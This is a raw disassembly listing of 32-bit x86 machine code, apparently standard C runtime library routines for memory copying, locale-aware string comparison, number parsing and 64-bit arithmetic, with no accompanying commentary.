  426b1f:	add    BYTE PTR [ebx+ebp*2+0x42],dl
  426b23:	add    BYTE PTR [ebx+ebp*2+0x42],bl
  426b27:	add    BYTE PTR [edi+0x6b],ch
  426b2a:	inc    edx
  426b2b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b31:	inc    esp
  426b32:	(bad)  
  426b33:	sbb    al,0x8b
  426b35:	inc    esp
  426b36:	mov    ds,WORD PTR [eax]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b50:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426b54:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426b58:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426b5c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426b60:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426b64:	lea    eax,[ecx*4+0x0]
  426b6b:	add    esi,eax
  426b6d:	add    edi,eax
  426b6f:	jmp    DWORD PTR [edx*4+0x426b78]
  426b76:	mov    edi,edi
  426b78:	mov    BYTE PTR [ebx+0x42],ch
  426b7b:	add    BYTE PTR [eax-0x5fffbd95],dl
  426b81:	imul   eax,DWORD PTR [edx+0x0],0xffffffb4
  426b85:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426b89:	inc    ebp
  426b8a:	or     BYTE PTR [esi+0x5f],bl
  426b8d:	leave  
  426b8e:	ret    
  426b8f:	nop
  426b90:	mov    al,BYTE PTR [esi+0x3]
  426b93:	mov    BYTE PTR [edi+0x3],al
  426b96:	mov    eax,DWORD PTR [ebp+0x8]
  426b99:	pop    esi
  426b9a:	pop    edi
  426b9b:	leave  
  426b9c:	ret    
  426b9d:	lea    ecx,[ecx+0x0]
  426ba0:	mov    al,BYTE PTR [esi+0x3]
  426ba3:	mov    BYTE PTR [edi+0x3],al
  426ba6:	mov    al,BYTE PTR [esi+0x2]
  426ba9:	mov    BYTE PTR [edi+0x2],al
  426bac:	mov    eax,DWORD PTR [ebp+0x8]
  426baf:	pop    esi
  426bb0:	pop    edi
  426bb1:	leave  
  426bb2:	ret    
  426bb3:	nop
  426bb4:	mov    al,BYTE PTR [esi+0x3]
  426bb7:	mov    BYTE PTR [edi+0x3],al
  426bba:	mov    al,BYTE PTR [esi+0x2]
  426bbd:	mov    BYTE PTR [edi+0x2],al
  426bc0:	mov    al,BYTE PTR [esi+0x1]
  426bc3:	mov    BYTE PTR [edi+0x1],al
  426bc6:	mov    eax,DWORD PTR [ebp+0x8]
  426bc9:	pop    esi
  426bca:	pop    edi
  426bcb:	leave  
  426bcc:	ret    
  426bcd:	push   ebp
  426bce:	mov    ebp,esp
  426bd0:	sub    esp,0xc
  426bd3:	mov    eax,ds:0x4646c0
  426bd8:	xor    eax,DWORD PTR [ebp+0x4]
  426bdb:	and    BYTE PTR [ebp-0x6],0x0
  426bdf:	push   0x6
  426be1:	mov    DWORD PTR [ebp-0x4],eax
  426be4:	lea    eax,[ebp-0xc]
  426be7:	push   eax
  426be8:	push   0x1004
  426bed:	push   DWORD PTR [ebp+0x8]
  426bf0:	call   DWORD PTR ds:0x42811c
  426bf6:	test   eax,eax
  426bf8:	jne    0x426bff
  426bfa:	or     eax,0xffffffff
  426bfd:	jmp    0x426c09
  426bff:	lea    eax,[ebp-0xc]
  426c02:	push   eax
  426c03:	call   0x426f0e
  426c08:	pop    ecx
  426c09:	mov    ecx,DWORD PTR [ebp-0x4]
  426c0c:	xor    ecx,DWORD PTR [ebp+0x4]
  426c0f:	call   0x42401c
  426c14:	leave  
  426c15:	ret    
  426c16:	push   0x38
  426c18:	push   0x428f00
  426c1d:	call   0x423950
  426c22:	mov    eax,ds:0x4646c0
  426c27:	xor    eax,DWORD PTR [ebp+0x4]
  426c2a:	mov    DWORD PTR [ebp-0x1c],eax
  426c2d:	xor    edi,edi
  426c2f:	mov    DWORD PTR [ebp-0x20],edi
  426c32:	mov    DWORD PTR [ebp-0x24],edi
  426c35:	mov    eax,DWORD PTR [ebp+0x14]
  426c38:	mov    ebx,DWORD PTR [eax]
  426c3a:	mov    DWORD PTR [ebp-0x28],ebx
  426c3d:	mov    DWORD PTR [ebp-0x2c],edi
  426c40:	mov    eax,DWORD PTR [ebp+0x8]
  426c43:	cmp    eax,DWORD PTR [ebp+0xc]
  426c46:	je     0x426dbf
  426c4c:	lea    ecx,[ebp-0x40]
  426c4f:	push   ecx
  426c50:	push   eax
  426c51:	mov    esi,DWORD PTR ds:0x4280e0
  426c57:	call   esi
  426c59:	test   eax,eax
  426c5b:	je     0x426c7d
  426c5d:	cmp    DWORD PTR [ebp-0x40],0x1
  426c61:	jne    0x426c7d
  426c63:	lea    eax,[ebp-0x40]
  426c66:	push   eax
  426c67:	push   DWORD PTR [ebp+0xc]
  426c6a:	call   esi
  426c6c:	test   eax,eax
  426c6e:	je     0x426c7d
  426c70:	cmp    DWORD PTR [ebp-0x40],0x1
  426c74:	jne    0x426c7d
  426c76:	mov    DWORD PTR [ebp-0x2c],0x1
  426c7d:	cmp    DWORD PTR [ebp-0x2c],edi
  426c80:	je     0x426c9c
  426c82:	cmp    ebx,0xffffffff
  426c85:	je     0x426c8b
  426c87:	mov    esi,ebx
  426c89:	jmp    0x426c97
  426c8b:	push   DWORD PTR [ebp+0x10]
  426c8e:	call   0x423f60
  426c93:	pop    ecx
  426c94:	mov    esi,eax
  426c96:	inc    esi
  426c97:	mov    DWORD PTR [ebp-0x44],esi
  426c9a:	jmp    0x426c9f
  426c9c:	mov    esi,DWORD PTR [ebp-0x44]
  426c9f:	cmp    DWORD PTR [ebp-0x2c],edi
  426ca2:	jne    0x426cbe
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   ebx
  426ca7:	push   DWORD PTR [ebp+0x10]
  426caa:	push   0x1
  426cac:	push   DWORD PTR [ebp+0x8]
  426caf:	call   DWORD PTR ds:0x42810c
  426cb5:	mov    esi,eax
  426cb7:	mov    DWORD PTR [ebp-0x44],esi
  426cba:	cmp    esi,edi
  426cbc:	je     0x426d16
  426cbe:	mov    DWORD PTR [ebp-0x4],edi
  426cc1:	lea    eax,[esi+esi*1]
  426cc4:	add    eax,0x3
  426cc7:	and    eax,0xfffffffc
  426cca:	call   0x4239a0
  426ccf:	mov    DWORD PTR [ebp-0x18],esp
  426cd2:	mov    ebx,esp
  426cd4:	mov    DWORD PTR [ebp-0x48],ebx
  426cd7:	lea    eax,[esi+esi*1]
  426cda:	push   eax
  426cdb:	push   edi
  426cdc:	push   ebx
  426cdd:	call   0x426250
  426ce2:	add    esp,0xc
  426ce5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426ce9:	jmp    0x426d02
  426ceb:	xor    eax,eax
  426ced:	inc    eax
  426cee:	ret    
  426cef:	mov    esp,DWORD PTR [ebp-0x18]
  426cf2:	call   0x426de5
  426cf7:	xor    edi,edi
  426cf9:	xor    ebx,ebx
  426cfb:	or     DWORD PTR [ebp-0x4],0xffffffff
  426cff:	mov    esi,DWORD PTR [ebp-0x44]
  426d02:	cmp    ebx,edi
  426d04:	jne    0x426d24
  426d06:	push   esi
  426d07:	push   0x2
  426d09:	call   0x424a68
  426d0e:	pop    ecx
  426d0f:	pop    ecx
  426d10:	mov    ebx,eax
  426d12:	cmp    ebx,edi
  426d14:	jne    0x426d1d
  426d16:	xor    eax,eax
  426d18:	jmp    0x426dd1
  426d1d:	mov    DWORD PTR [ebp-0x24],0x1
  426d24:	push   esi
  426d25:	push   ebx
  426d26:	push   DWORD PTR [ebp-0x28]
  426d29:	push   DWORD PTR [ebp+0x10]
  426d2c:	push   0x1
  426d2e:	push   DWORD PTR [ebp+0x8]
  426d31:	call   DWORD PTR ds:0x42810c
  426d37:	test   eax,eax
  426d39:	je     0x426dc2
  426d3f:	cmp    DWORD PTR [ebp+0x18],edi
  426d42:	je     0x426d64
  426d44:	push   edi
  426d45:	push   edi
  426d46:	push   DWORD PTR [ebp+0x1c]
  426d49:	push   DWORD PTR [ebp+0x18]
  426d4c:	push   esi
  426d4d:	push   ebx
  426d4e:	push   edi
  426d4f:	push   DWORD PTR [ebp+0xc]
  426d52:	call   DWORD PTR ds:0x428090
  426d58:	test   eax,eax
  426d5a:	je     0x426dc2
  426d5c:	mov    eax,DWORD PTR [ebp+0x18]
  426d5f:	mov    DWORD PTR [ebp-0x20],eax
  426d62:	jmp    0x426dc2
  426d64:	cmp    DWORD PTR [ebp-0x2c],edi
  426d67:	jne    0x426d7f
  426d69:	push   edi
  426d6a:	push   edi
  426d6b:	push   edi
  426d6c:	push   edi
  426d6d:	push   esi
  426d6e:	push   ebx
  426d6f:	push   edi
  426d70:	push   DWORD PTR [ebp+0xc]
  426d73:	call   DWORD PTR ds:0x428090
  426d79:	mov    esi,eax
  426d7b:	cmp    esi,edi
  426d7d:	je     0x426dc2
  426d7f:	push   esi
  426d80:	push   0x1
  426d82:	call   0x424a68
  426d87:	pop    ecx
  426d88:	pop    ecx
  426d89:	mov    DWORD PTR [ebp-0x20],eax
  426d8c:	cmp    eax,edi
  426d8e:	je     0x426dc2
  426d90:	push   edi
  426d91:	push   edi
  426d92:	push   esi
  426d93:	push   eax
  426d94:	push   esi
  426d95:	push   ebx
  426d96:	push   edi
  426d97:	push   DWORD PTR [ebp+0xc]
  426d9a:	call   DWORD PTR ds:0x428090
  426da0:	cmp    eax,edi
  426da2:	jne    0x426db2
  426da4:	push   DWORD PTR [ebp-0x20]
  426da7:	call   0x42455a
  426dac:	pop    ecx
  426dad:	mov    DWORD PTR [ebp-0x20],edi
  426db0:	jmp    0x426dc2
  426db2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426db6:	je     0x426dc2
  426db8:	mov    ecx,DWORD PTR [ebp+0x14]
  426dbb:	mov    DWORD PTR [ecx],eax
  426dbd:	jmp    0x426dc2
  426dbf:	mov    ebx,DWORD PTR [ebp-0x48]
  426dc2:	cmp    DWORD PTR [ebp-0x24],edi
  426dc5:	je     0x426dce
  426dc7:	push   ebx
  426dc8:	call   0x42455a
  426dcd:	pop    ecx
  426dce:	mov    eax,DWORD PTR [ebp-0x20]
  426dd1:	lea    esp,[ebp-0x54]
  426dd4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426dd7:	xor    ecx,DWORD PTR [ebp+0x4]
  426dda:	call   0x42401c
  426ddf:	call   0x42398b
  426de4:	ret    
  426de5:	push   ebp
  426de6:	mov    ebp,esp
  426de8:	sub    esp,0x48
  426deb:	push   ebx
  426dec:	push   esi
  426ded:	push   edi
  426dee:	push   0x4
  426df0:	pop    eax
  426df1:	call   0x4239a0
  426df6:	mov    ebx,esp
  426df8:	push   0x1c
  426dfa:	lea    eax,[ebp-0x24]
  426dfd:	push   eax
  426dfe:	push   ebx
  426dff:	call   DWORD PTR ds:0x42805c
  426e05:	test   eax,eax
  426e07:	je     0x426e7a
  426e09:	mov    edi,DWORD PTR [ebp-0x20]
  426e0c:	lea    eax,[ebp-0x48]
  426e0f:	push   eax
  426e10:	call   DWORD PTR ds:0x428128
  426e16:	mov    eax,DWORD PTR [ebp-0x44]
  426e19:	lea    esi,[eax-0x1]
  426e1c:	not    esi
  426e1e:	and    esi,ebx
  426e20:	sub    esi,eax
  426e22:	mov    DWORD PTR [ebp-0x4],eax
  426e25:	mov    eax,ds:0x464d64
  426e2a:	mov    ecx,eax
  426e2c:	dec    ecx
  426e2d:	neg    ecx
  426e2f:	sbb    ecx,ecx
  426e31:	and    ecx,0xffff1000
  426e37:	add    ecx,0x11000
  426e3d:	add    ecx,edi
  426e3f:	cmp    esi,ecx
  426e41:	jb     0x426e7a
  426e43:	cmp    eax,0x1
  426e46:	je     0x426e92
  426e48:	mov    ebx,edi
  426e4a:	mov    edi,0x1000
  426e4f:	push   0x1c
  426e51:	lea    eax,[ebp-0x24]
  426e54:	push   eax
  426e55:	push   ebx
  426e56:	call   DWORD PTR ds:0x42805c
  426e5c:	test   eax,eax
  426e5e:	je     0x426e7a
  426e60:	add    ebx,DWORD PTR [ebp-0x18]
  426e63:	test   DWORD PTR [ebp-0x14],edi
  426e66:	je     0x426e4f
  426e68:	test   BYTE PTR [ebp-0xf],0x1
  426e6c:	mov    ebx,DWORD PTR [ebp-0x24]
  426e6f:	je     0x426e76
  426e71:	xor    eax,eax
  426e73:	inc    eax
  426e74:	jmp    0x426eae
  426e76:	cmp    esi,ebx
  426e78:	jae    0x426e7e
  426e7a:	xor    eax,eax
  426e7c:	jmp    0x426eae
  426e7e:	push   0x4
  426e80:	push   edi
  426e81:	push   DWORD PTR [ebp-0x4]
  426e84:	push   ebx
  426e85:	call   DWORD PTR ds:0x4280ec
  426e8b:	mov    eax,ds:0x464d64
  426e90:	jmp    0x426e94
  426e92:	mov    ebx,esi
  426e94:	dec    eax
  426e95:	neg    eax
  426e97:	sbb    eax,eax
  426e99:	and    eax,0x103
  426e9e:	lea    ecx,[ebp-0x8]
  426ea1:	push   ecx
  426ea2:	inc    eax
  426ea3:	push   eax
  426ea4:	push   DWORD PTR [ebp-0x4]
  426ea7:	push   ebx
  426ea8:	call   DWORD PTR ds:0x428124
  426eae:	lea    esp,[ebp-0x54]
  426eb1:	pop    edi
  426eb2:	pop    esi
  426eb3:	pop    ebx
  426eb4:	leave  
  426eb5:	ret    
  426eb6:	int3   
  426eb7:	int3   
  426eb8:	int3   
  426eb9:	int3   
  426eba:	int3   
  426ebb:	int3   
  426ebc:	int3   
  426ebd:	int3   
  426ebe:	int3   
  426ebf:	int3   
  426ec0:	push   ebp
  426ec1:	mov    ebp,esp
  426ec3:	push   edi
  426ec4:	push   esi
  426ec5:	push   ebx
  426ec6:	mov    esi,DWORD PTR [ebp+0xc]
  426ec9:	mov    edi,DWORD PTR [ebp+0x8]
  426ecc:	mov    al,0xff
  426ece:	mov    edi,edi
  426ed0:	or     al,al
  426ed2:	je     0x426f06
  426ed4:	mov    al,BYTE PTR [esi]
  426ed6:	add    esi,0x1
  426ed9:	mov    ah,BYTE PTR [edi]
  426edb:	add    edi,0x1
  426ede:	cmp    ah,al
  426ee0:	je     0x426ed0
  426ee2:	sub    al,0x41
  426ee4:	cmp    al,0x1a
  426ee6:	sbb    cl,cl
  426ee8:	and    cl,0x20
  426eeb:	add    al,cl
  426eed:	add    al,0x41
  426eef:	xchg   al,ah
  426ef1:	sub    al,0x41
  426ef3:	cmp    al,0x1a
  426ef5:	sbb    cl,cl
  426ef7:	and    cl,0x20
  426efa:	add    al,cl
  426efc:	add    al,0x41
  426efe:	cmp    al,ah
  426f00:	je     0x426ed0
  426f02:	sbb    al,al
  426f04:	sbb    al,0xff
  426f06:	movsx  eax,al
  426f09:	pop    ebx
  426f0a:	pop    esi
  426f0b:	pop    edi
  426f0c:	leave  
  426f0d:	ret    
  426f0e:	push   esi
  426f0f:	push   edi
  426f10:	call   0x423803
  426f15:	mov    edi,DWORD PTR [eax+0x64]
  426f18:	cmp    edi,DWORD PTR ds:0x46481c
  426f1e:	je     0x426f27
  426f20:	call   0x424caf
  426f25:	mov    edi,eax
  426f27:	mov    esi,DWORD PTR [esp+0xc]
  426f2b:	cmp    DWORD PTR [edi+0x28],0x1
  426f2f:	movzx  eax,BYTE PTR [esi]
  426f32:	jle    0x426f42
  426f34:	push   0x8
  426f36:	push   eax
  426f37:	push   edi
  426f38:	call   0x426f96
  426f3d:	add    esp,0xc
  426f40:	jmp    0x426f4c
  426f42:	mov    ecx,DWORD PTR [edi+0x48]
  426f45:	movzx  eax,BYTE PTR [ecx+eax*2]
  426f49:	and    eax,0x8
  426f4c:	test   eax,eax
  426f4e:	je     0x426f53
  426f50:	inc    esi
  426f51:	jmp    0x426f2b
  426f53:	movzx  ecx,BYTE PTR [esi]
  426f56:	inc    esi
  426f57:	cmp    ecx,0x2d
  426f5a:	mov    edx,ecx
  426f5c:	je     0x426f63
  426f5e:	cmp    ecx,0x2b
  426f61:	jne    0x426f67
  426f63:	movzx  ecx,BYTE PTR [esi]
  426f66:	inc    esi
  426f67:	xor    eax,eax
  426f69:	cmp    ecx,0x30
  426f6c:	jl     0x426f78
  426f6e:	cmp    ecx,0x39
  426f71:	jg     0x426f78
  426f73:	sub    ecx,0x30
  426f76:	jmp    0x426f7b
  426f78:	or     ecx,0xffffffff
  426f7b:	cmp    ecx,0xffffffff
  426f7e:	je     0x426f8c
  426f80:	lea    eax,[eax+eax*4]
  426f83:	lea    eax,[ecx+eax*2]
  426f86:	movzx  ecx,BYTE PTR [esi]
  426f89:	inc    esi
  426f8a:	jmp    0x426f69
  426f8c:	cmp    edx,0x2d
  426f8f:	pop    edi
  426f90:	pop    esi
  426f91:	jne    0x426f95
  426f93:	neg    eax
  426f95:	ret    
  426f96:	push   ebp
  426f97:	mov    ebp,esp
  426f99:	push   ecx
  426f9a:	mov    eax,DWORD PTR [ebp+0xc]
  426f9d:	lea    ecx,[eax+0x1]
  426fa0:	cmp    ecx,0x100
  426fa6:	mov    ecx,DWORD PTR [ebp+0x8]
  426fa9:	ja     0x426fb4
  426fab:	mov    ecx,DWORD PTR [ecx+0x48]
  426fae:	movzx  eax,WORD PTR [ecx+eax*2]
  426fb2:	jmp    0x427008
  426fb4:	push   esi
  426fb5:	mov    edx,eax
  426fb7:	sar    edx,0x8
  426fba:	push   edi
  426fbb:	mov    edi,DWORD PTR [ecx+0x48]
  426fbe:	movzx  esi,dl
  426fc1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426fc6:	pop    edi
  426fc7:	pop    esi
  426fc8:	je     0x426fd9
  426fca:	and    BYTE PTR [ebp-0x2],0x0
  426fce:	push   0x2
  426fd0:	mov    BYTE PTR [ebp-0x3],al
  426fd3:	mov    BYTE PTR [ebp-0x4],dl
  426fd6:	pop    eax
  426fd7:	jmp    0x426fe3
  426fd9:	and    BYTE PTR [ebp-0x3],0x0
  426fdd:	mov    BYTE PTR [ebp-0x4],al
  426fe0:	xor    eax,eax
  426fe2:	inc    eax
  426fe3:	push   0x1
  426fe5:	push   DWORD PTR [ecx+0x14]
  426fe8:	push   DWORD PTR [ecx+0x4]
  426feb:	lea    ecx,[ebp+0xe]
  426fee:	push   ecx
  426fef:	push   eax
  426ff0:	lea    eax,[ebp-0x4]
  426ff3:	push   eax
  426ff4:	push   0x1
  426ff6:	call   0x426078
  426ffb:	add    esp,0x1c
  426ffe:	test   eax,eax
  427000:	jne    0x427004
  427002:	leave  
  427003:	ret    
  427004:	movzx  eax,WORD PTR [ebp+0xe]
  427008:	and    eax,DWORD PTR [ebp+0x10]
  42700b:	leave  
  42700c:	ret    
  42700d:	int3   
  42700e:	int3   
  42700f:	int3   
  427010:	mov    eax,DWORD PTR [esp+0x8]
  427014:	mov    ecx,DWORD PTR [esp+0x10]
  427018:	or     ecx,eax
  42701a:	mov    ecx,DWORD PTR [esp+0xc]
  42701e:	jne    0x427029
  427020:	mov    eax,DWORD PTR [esp+0x4]
  427024:	mul    ecx
  427026:	ret    0x10
  427029:	push   ebx
  42702a:	mul    ecx
  42702c:	mov    ebx,eax
  42702e:	mov    eax,DWORD PTR [esp+0x8]
  427032:	mul    DWORD PTR [esp+0x14]
  427036:	add    ebx,eax
  427038:	mov    eax,DWORD PTR [esp+0x8]
  42703c:	mul    ecx
  42703e:	add    edx,ebx
  427040:	pop    ebx
  427041:	ret    0x10
  427044:	int3   
  427045:	int3   
  427046:	int3   
  427047:	int3   
  427048:	int3   
  427049:	int3   
  42704a:	int3   
  42704b:	int3   
  42704c:	int3   
  42704d:	int3   
  42704e:	int3   
  42704f:	int3   
  427050:	push   ebp
  427051:	mov    ebp,esp
  427053:	push   edi
  427054:	push   esi
  427055:	push   ebx
  427056:	mov    ecx,DWORD PTR [ebp+0x10]
  427059:	or     ecx,ecx
  42705b:	je     0x4270aa
  42705d:	mov    esi,DWORD PTR [ebp+0x8]
  427060:	mov    edi,DWORD PTR [ebp+0xc]
  427063:	mov    bh,0x41
  427065:	mov    bl,0x5a
  427067:	mov    dh,0x20
  427069:	lea    ecx,[ecx+0x0]
  42706c:	mov    ah,BYTE PTR [esi]
  42706e:	or     ah,ah
  427070:	mov    al,BYTE PTR [edi]
  427072:	je     0x42709b
  427074:	or     al,al
  427076:	je     0x42709b
  427078:	add    esi,0x1
  42707b:	add    edi,0x1
  42707e:	cmp    ah,bh
  427080:	jb     0x427088
  427082:	cmp    ah,bl
  427084:	ja     0x427088
  427086:	add    ah,dh
  427088:	cmp    al,bh
  42708a:	jb     0x427092
  42708c:	cmp    al,bl
  42708e:	ja     0x427092
  427090:	add    al,dh
  427092:	cmp    ah,al
  427094:	jne    0x4270a1
  427096:	sub    ecx,0x1
  427099:	jne    0x42706c
  42709b:	xor    ecx,ecx
  42709d:	cmp    ah,al
  42709f:	je     0x4270aa
  4270a1:	mov    ecx,0xffffffff
  4270a6:	jb     0x4270aa
  4270a8:	neg    ecx
  4270aa:	mov    eax,ecx
  4270ac:	pop    ebx
  4270ad:	pop    esi
  4270ae:	pop    edi
  4270af:	leave  
  4270b0:	ret    
  4270b1:	int3   
  4270b2:	int3   
  4270b3:	int3   
  4270b4:	int3   
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	push   esi
  4270c1:	mov    eax,DWORD PTR [esp+0x14]
  4270c5:	or     eax,eax
  4270c7:	jne    0x4270f1
  4270c9:	mov    ecx,DWORD PTR [esp+0x10]
  4270cd:	mov    eax,DWORD PTR [esp+0xc]
  4270d1:	xor    edx,edx
  4270d3:	div    ecx
  4270d5:	mov    ebx,eax
  4270d7:	mov    eax,DWORD PTR [esp+0x8]
  4270db:	div    ecx
  4270dd:	mov    esi,eax
  4270df:	mov    eax,ebx
  4270e1:	mul    DWORD PTR [esp+0x10]
  4270e5:	mov    ecx,eax
  4270e7:	mov    eax,esi
  4270e9:	mul    DWORD PTR [esp+0x10]
  4270ed:	add    edx,ecx
  4270ef:	jmp    0x427138
  4270f1:	mov    ecx,eax
  4270f3:	mov    ebx,DWORD PTR [esp+0x10]
  4270f7:	mov    edx,DWORD PTR [esp+0xc]
  4270fb:	mov    eax,DWORD PTR [esp+0x8]
  4270ff:	shr    ecx,1
  427101:	rcr    ebx,1
  427103:	shr    edx,1
  427105:	rcr    eax,1
  427107:	or     ecx,ecx
  427109:	jne    0x4270ff
  42710b:	div    ebx
  42710d:	mov    esi,eax
  42710f:	mul    DWORD PTR [esp+0x14]
  427113:	mov    ecx,eax
  427115:	mov    eax,DWORD PTR [esp+0x10]
  427119:	mul    esi
  42711b:	add    edx,ecx
  42711d:	jb     0x42712d
  42711f:	cmp    edx,DWORD PTR [esp+0xc]
  427123:	ja     0x42712d
  427125:	jb     0x427136
  427127:	cmp    eax,DWORD PTR [esp+0x8]
  42712b:	jbe    0x427136
  42712d:	dec    esi
  42712e:	sub    eax,DWORD PTR [esp+0x10]
  427132:	sbb    edx,DWORD PTR [esp+0x14]
  427136:	xor    ebx,ebx
  427138:	sub    eax,DWORD PTR [esp+0x8]
  42713c:	sbb    edx,DWORD PTR [esp+0xc]
  427140:	neg    edx
  427142:	neg    eax
  427144:	sbb    edx,0x0
  427147:	mov    ecx,edx
  427149:	mov    edx,ebx
  42714b:	mov    ebx,ecx
  42714d:	mov    ecx,eax
  42714f:	mov    eax,esi
  427151:	pop    esi
  427152:	ret    0x10
  427155:	int3   
  427156:	int3   
  427157:	int3   
  427158:	int3   
  427159:	int3   
  42715a:	int3   
  42715b:	int3   
  42715c:	int3   
  42715d:	int3   
  42715e:	int3   
  42715f:	int3   
  427160:	lea    eax,[edx-0x1]
  427163:	pop    ebx
  427164:	ret    
  427165:	lea    esp,[esp+0x0]
  42716c:	lea    esp,[esp+0x0]
  427170:	xor    eax,eax
  427172:	mov    al,BYTE PTR [esp+0x8]
  427176:	push   ebx
  427177:	mov    ebx,eax
  427179:	shl    eax,0x8
  42717c:	mov    edx,DWORD PTR [esp+0x8]
  427180:	test   edx,0x3
  427186:	je     0x42719d
  427188:	mov    cl,BYTE PTR [edx]
  42718a:	add    edx,0x1
  42718d:	cmp    cl,bl
  42718f:	je     0x427160
  427191:	test   cl,cl
  427193:	je     0x4271e6
  427195:	test   edx,0x3
  42719b:	jne    0x427188
  42719d:	or     ebx,eax
  42719f:	push   edi
  4271a0:	mov    eax,ebx
  4271a2:	shl    ebx,0x10
  4271a5:	push   esi
  4271a6:	or     ebx,eax
  4271a8:	mov    ecx,DWORD PTR [edx]
  4271aa:	mov    edi,0x7efefeff
  4271af:	mov    eax,ecx
  4271b1:	mov    esi,edi
  4271b3:	xor    ecx,ebx
  4271b5:	add    esi,eax
  4271b7:	add    edi,ecx
  4271b9:	xor    ecx,0xffffffff
  4271bc:	xor    eax,0xffffffff
  4271bf:	xor    ecx,edi
  4271c1:	xor    eax,esi
  4271c3:	add    edx,0x4
  4271c6:	and    ecx,0x81010100
  4271cc:	jne    0x4271ea
  4271ce:	and    eax,0x81010100
  4271d3:	je     0x4271a8
  4271d5:	and    eax,0x1010100
  4271da:	jne    0x4271e4
  4271dc:	and    esi,0x80000000
  4271e2:	jne    0x4271a8
  4271e4:	pop    esi
  4271e5:	pop    edi
  4271e6:	pop    ebx
  4271e7:	xor    eax,eax
  4271e9:	ret    
  4271ea:	mov    eax,DWORD PTR [edx-0x4]
  4271ed:	cmp    al,bl
  4271ef:	je     0x427227
  4271f1:	test   al,al
  4271f3:	je     0x4271e4
  4271f5:	cmp    ah,bl
  4271f7:	je     0x427220
  4271f9:	test   ah,ah
  4271fb:	je     0x4271e4
  4271fd:	shr    eax,0x10
  427200:	cmp    al,bl
  427202:	je     0x427219
  427204:	test   al,al
  427206:	je     0x4271e4
  427208:	cmp    ah,bl
  42720a:	je     0x427212
  42720c:	test   ah,ah
  42720e:	je     0x4271e4
  427210:	jmp    0x4271a8
  427212:	pop    esi
  427213:	pop    edi
  427214:	lea    eax,[edx-0x1]
  427217:	pop    ebx
  427218:	ret    
  427219:	lea    eax,[edx-0x2]
  42721c:	pop    esi
  42721d:	pop    edi
  42721e:	pop    ebx
  42721f:	ret    
  427220:	lea    eax,[edx-0x3]
  427223:	pop    esi
  427224:	pop    edi
  427225:	pop    ebx
  427226:	ret    
  427227:	lea    eax,[edx-0x4]
  42722a:	pop    esi
  42722b:	pop    edi
  42722c:	pop    ebx
  42722d:	ret    
  42722e:	jmp    DWORD PTR ds:0x428120
